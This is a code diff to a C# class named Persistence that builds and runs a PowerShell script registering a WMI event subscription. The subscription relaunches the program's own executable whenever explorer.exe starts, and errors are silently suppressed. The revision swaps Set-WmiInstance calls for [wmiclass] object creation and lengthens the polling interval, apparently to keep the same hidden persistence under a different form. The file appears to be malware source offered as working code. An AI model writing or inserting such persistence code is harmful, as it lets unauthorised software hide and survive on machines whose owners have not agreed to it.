@@ -627,13 +627,18 @@ internal static partial class Persistence
             if (string.IsNullOrEmpty(selfPath)) return;
             var safePath = selfPath.Replace("'", "''");
             var script = $@"
-$ns = 'ROOT\subscription'
-$n  = '{name}'
-$q  = ""SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'""
+$ns = 'ROOT\subscription'; $n = '{name}'
 try {{
-    $f = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{{Name=$n;EventNamespace='root\cimv2';QueryLanguage='WQL';Query=$q}}
-    $c = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{{Name=$n;CommandLineTemplate='""{safePath}""'}}
-    Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{{Filter=$f;Consumer=$c}} | Out-Null
+    $f = ([wmiclass]""\\.\root\subscription:__EventFilter"").CreateInstance()
+    $f.QueryLanguage = 'WQL'
+    $f.Query = ""SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'""
+    $f.Name = $n; $f.EventNameSpace = 'root\cimv2'; $null = $f.Put()
+    $c = ([wmiclass]""\\.\root\subscription:CommandLineEventConsumer"").CreateInstance()
+    $c.Name = $n; $c.ExecutablePath = '{safePath}'; $null = $c.Put()
+    $b = ([wmiclass]""\\.\root\subscription:__FilterToConsumerBinding"").CreateInstance()
+    $b.Filter = ""\\.\root\subscription:__EventFilter.Name='$n'""
+    $b.Consumer = ""\\.\root\subscription:CommandLineEventConsumer.Name='$n'""
+    $null = $b.Put()
 }} catch {{}}
 ";
             RunPs(script);
